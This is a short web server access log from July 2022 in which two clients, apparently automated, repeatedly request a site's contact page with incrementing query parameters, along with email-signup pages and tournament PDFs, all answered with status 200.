::ffff:38.242.128.157 - - [26/Jul/2022:13:25:02 +0000] "GET /contact?s=1&ss=3 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:02 +0000] "GET /contact HTTP/1.0" 200 10017 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:02 +0000] "GET /contact?s=1&ss=4 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:03 +0000] "GET /joinemail?type=promotions HTTP/1.0" 200 8841 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:03 +0000] "GET /contact?s=1&ss=5 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:03 +0000] "GET /contact?s=1&ss=6 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:03 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.0" 200 3770165 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:03 +0000] "GET /contact?s=1&ss=7 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:04 +0000] "GET /contact?s=1&ss=8 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:04 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.0" 200 766218 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:04 +0000] "GET /joinemail?type=tournaments HTTP/1.0" 200 8829 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:04 +0000] "GET /contact?s=1&ss=9 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:04 +0000] "GET /contact?s=1&ss=10 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:04 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.0" 200 8998 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:05 +0000] "GET /contact?s=1&ss=11 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:05 +0000] "GET /contact?s=1&ss=0 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:05 +0000] "GET /contact HTTP/1.0" 200 10017 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:05 +0000] "GET /contact?s=1&ss=1 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:05 +0000] "GET /contact?s=1&ss=0 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:06 +0000] "GET /contact?s=1&ss=2 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:06 +0000] "GET /contact?s=1&ss=1 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:06 +0000] "GET /contact?s=1&ss=3 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:06 +0000] "GET /contact?s=1&ss=2 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:06 +0000] "GET /contact?s=1&ss=4 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=3 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=5 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=4 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=6 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=5 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:07 +0000] "GET /contact?s=1&ss=7 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:08 +0000] "GET /contact?s=1&ss=6 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:08 +0000] "GET /contact?s=1&ss=8 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:08 +0000] "GET /contact?s=1&ss=7 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:08 +0000] "GET /contact?s=1&ss=9 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:08 +0000] "GET /contact?s=1&ss=8 HTTP/1.0" 200 9997 "-" "-"
